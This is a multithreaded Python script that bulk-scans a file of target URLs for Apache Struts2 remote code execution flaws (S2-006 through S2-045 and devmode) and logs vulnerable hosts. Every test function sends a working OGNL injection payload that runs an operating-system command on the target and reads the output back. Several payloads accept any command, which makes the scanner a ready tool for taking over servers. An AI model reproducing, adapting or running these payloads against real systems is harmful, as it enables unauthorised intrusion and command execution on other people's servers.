# author = "Loid and skeleton"
# python3.4
# event多线程
import requests
import json
import threading
import os
import time
from queue import Queue


event = threading.Event()
event.set()
q = Queue(-1)

def struts2_006(start_line,url):
    print('[thread:{0}] test {1} --> struts2_006'.format(start_line,url))
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    exp = '''('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))&('\43c')(('\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\43mycmd\75\'netstat -an\'')(d))&(h)(('\43myret\75@java.lang.Runtime@getRuntime().exec(\43mycmd)')(d))&(i)(('\43mydat\75new\40java.io.DataInputStream(\43myret.getInputStream())')(d))&(j)(('\43myres\75new\40byte[51020]')(d))&(k)(('\43mydat.readFully(\43myres)')(d))&(l)(('\43mystr\75new\40java.lang.String(\43myres)')(d))&(m)(('\43myout\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(n)(('\43myout.getWriter().println(\43mystr)')(d))'''
    try:
        resp = requests.post(url, data=exp, headers=headers, timeout=10)
        if "0.0.0.0" in resp.text:
            return "s2-006"
    except:
        #print('test --> struts2_006 Failed!')
        return None
    return None
def struts2_009(start_line,url):
    print('[thread:{0}] test {1} --> struts2_009'.format(start_line, url))
    exp = '''?class.classLoader.jarPath=%28%23context["xwork.MethodAccessor.denyMethodExecution"]%3d+new+java.lang.Boolean%28false%29%2c+%23_memberAccess["allowStaticMethodAccess"]%3dtrue%2c+%23a%3d%40java.lang.Runtime%40getRuntime%28%29.exec%28%27netstat -an%27%29.getInputStream%28%29%2c%23b%3dnew+java.io.InputStreamReader%28%23a%29%2c%23c%3dnew+java.io.BufferedReader%28%23b%29%2c%23d%3dnew+char[50000]%2c%23c.read%28%23d%29%2c%23sbtest%3d%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2c%23sbtest.println%28%23d%29%2c%23sbtest.close%28%29%29%28meh%29&z[%28class.classLoader.jarPath%29%28%27meh%27%29]'''
    url += exp
    try:
        resp = requests.get(url, timeout=10)
        if "0.0.0.0" in resp.text:
            return "s2-009"
    except:
        #print('test --> struts2_009 Failed!')
        return None
    return None
def struts2_013(start_line,url):
    print('[thread:{0}] test {1} --> struts2_013'.format(start_line, url))
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    exp = '''a=1${(%23_memberAccess["allowStaticMethodAccess"]=true,%23a=@java.lang.Runtime@getRuntime().exec('netstat -an').getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[50000],%23c.read(%23d),%23sbtest=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23sbtest.println(%23d),%23sbtest.close())}'''
    try:
        resp = requests.post(url, data=exp, headers=headers, timeout=10)
        if "0.0.0.0" in resp.text:
            return "s2-013"
    except:
        #print('test --> struts2_013 Failed!')
        return None
    return None
def struts2_016(start_line,url):
    print('[thread:{0}] test {1} --> struts2_016'.format(start_line, url))
    exp = '''?redirect:$%7B%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%20%7B'netstat','-an'%7D)).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader%20(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char%5B50000%5D,%23d.read(%23e),%23matt%3d%20%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println%20(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()%7D'''
    url += exp
    try:
        resp = requests.get(url, timeout=10)
        if "0.0.0.0" in resp.text:
            return "s2-016"
    except:
        #print('test --> struts2_016 Failed!')
        return None
    return None
def struts2_016_multipart_formdata__special(start_line,url):
    print('[thread:{0}] test {1} --> struts2_016_multipart_formdata__special'.format(start_line, url))
    headers = {
        "Accept-Encoding": "gzip, deflate",
        "Connection": " Keep-Alive",
        "Cookie": "",
        "Content-Type": "multipart/form-data; boundary=------------------------4a606c052a893987",
    }
    exp = '''--------------------------4a606c052a893987\r\nContent-Disposition: form-data; name="method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#res=@org.apache.struts2.ServletActionContext@getResponse(),#res.setCharacterEncoding(#parameters.encoding[0]),#w=#res.getWriter(),#s=new java.util.Scanner(@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0]).getInputStream()).useDelimiter(#parameters.pp[0]),#str=#s.hasNext()?#s.next():#parameters.ppp[0],#w.print(#str),#w.close(),1?#xx:#request.toString&cmd=netstat -ano&pp=\\A&ppp= &encoding=UTF-8"\r\n\r\n-1\r\n--------------------------4a606c052a893987--'''
    try:
        resp = requests.post(url, data=exp, headers=headers, timeout=10)
        if "0.0.0.0" in resp.text:
            return "s2-016"
    except:
        #print('test --> struts2_016_multipart_formdata__special Failed!')
        return None
    return None
def struts2_019(start_line,url):
    print('[thread:{0}] test {1} --> struts2_019'.format(start_line, url))
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    exp = '''debug=command&expression=#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#f.setAccessible(true),#f.set(#_memberAccess,true),#req=@org.apache.struts2.ServletActionContext@getRequest(),#resp=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#a=(new java.lang.ProcessBuilder(new java.lang.String[]{'netstat','-an'})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[10000],#d.read(#e),#resp.println(#e),#resp.close()'''
    url += exp
    try:
        resp = requests.post(url, data=exp, headers=headers, timeout=10)
        if "0.0.0.0" in resp.text:
            return "s2-019"
    except:
        #print('test --> struts2_019 Failed!')
        return None
    return None
def struts2_032(start_line,url):
    print('[thread:{0}] test {1} --> struts2_032'.format(start_line, url))
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    exp = '''?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&cmd=netstat%20-an&pp=\\A&ppp=%20&encoding=UTF-8'''
    url += exp
    try:
        resp = requests.get(url, headers=headers, timeout=10)
        if "0.0.0.0" in resp.text:
            return "s2-032"
    except:
        #print('test --> struts2_032 Failed!')
        return None
    return None
def struts2_devmode(start_line,url):
    print('[thread:{0}] test {1} --> struts2_devmode'.format(start_line, url))
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    exp = '''?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context[%23parameters.rpsobj[0]].getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()))):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=123456789&command=netstat -an'''
    url += exp
    try:
        resp = requests.get(url, headers=headers, timeout=10)
        if "0.0.0.0" in resp.text:
            return "s2-devmode"
    except:
        #print('test --> struts2_devmode Failed!')
        return None
    return None

def struts2_045(start_line,url):
    print('[thread:{0}] test {1} --> struts2_045'.format(start_line, url))
    command = 'netstat -ano'
    headers = {'Content-Type': 'multipart/form-data; boundary=f363ec3cc5ab44708db6a275b1f31a16',"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"}
    headers["Content-Type"] = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=' \
                          "+command+"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"

    data = json.dumps({"image1":url})
    try:
        resp = requests.post(url,data=data,headers=headers)
        if "0.0.0.0" in resp.text:
            return "struts2_045"
    except requests.ConnectionError as e:
        return None
    return None

def struts2_all(start_line,url):
    start_time = time.ctime()
    print('start time : {0}'.format(start_time))
    res = struts2_045(start_line,url) or struts2_devmode(start_line,url) or struts2_032(start_line,url) or struts2_019(start_line,url) \
          or struts2_016_multipart_formdata__special(start_line,url) or struts2_016(start_line,url) or struts2_013(start_line,url) \
          or struts2_009(start_line,url) or struts2_006(start_line,url)
    if res:
        save_all(url,res)
        print(' Success! {0}'.format(res))
    else:
        print(' Filed! Not Exist st2!')

def open_url():
    line_num = 0
    url_path = r'C:\\Users\\Administrator\\Desktop\\py\\tools\\st2\\action.txt'
    f = open(url_path,'r')
    f.readline()
    for each_line in f:
        q.put(each_line[:-1])
        line_num += 1
    return q,line_num

def save_all(url,res):
    path = os.getcwd()
    with open(r'{0}\\st2_all.txt'.format(path),'at') as f:
        f.writelines('[+]' + url + '          Exist {0}!\n'.format(res))


class st2_thread(threading.Thread):
    def __init__(self,num,q):
        threading.Thread.__init__(self)
        self.num = num
        self.q = q

    def run(self):
        while event.is_set():
            if self.q.empty():
                event.clear()
            else:
                struts2_all(self.num, q.get())

def scan_Thread(q):
    threads = []
    thread_num = 3
    for num in range(1,thread_num+1):
        t = st2_thread(num,q)
        threads.append(t)
        t.start()
    for t in threads:
        t.join()

if __name__ == '__main__':
    q,end_line = open_url()
    start_line = 0
    scan_Thread(q)
